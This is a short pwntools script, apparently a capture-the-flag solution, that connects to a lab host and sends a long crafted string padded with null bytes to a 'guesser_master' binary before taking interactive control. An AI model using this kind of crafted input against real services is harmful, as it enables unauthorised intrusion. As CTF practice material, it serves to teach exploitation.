from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.gdbinit = 'pwndbg'
p = remote('192.168.201.3',35006)
#p = process('./guesser_master')
#input()
#p = gdb.debug('./guesser_master', gdbscript="break main")
offset = 256 + 2

stri = b"MSWASIBMFBFLWCJCGWNAEEIHWXWAVJOIDOIXWKNFNSQKWAMEWCEDGOMDOJGKVWVYNGYLSMSGIJQFLFJKINNQDCWTLFFHEDISJKGDWYJHKBNVIYGSNVKSXJMLQTVUYGPJQVOQWXXHBNDMNLFDHRVHBKTTHPRGXHRREGIDHILKYOWMDDPKUNSYAOSJGKSEUMVBTGEDRPNQHNDKQUWNKPMMEIYMURRPEPQAWVDONTFUHKHXHFNTUDGCLFOIYIBEYTG"
print(len(stri))
stri += b"\0\0\0"

p.sendline(stri)
p.interactive()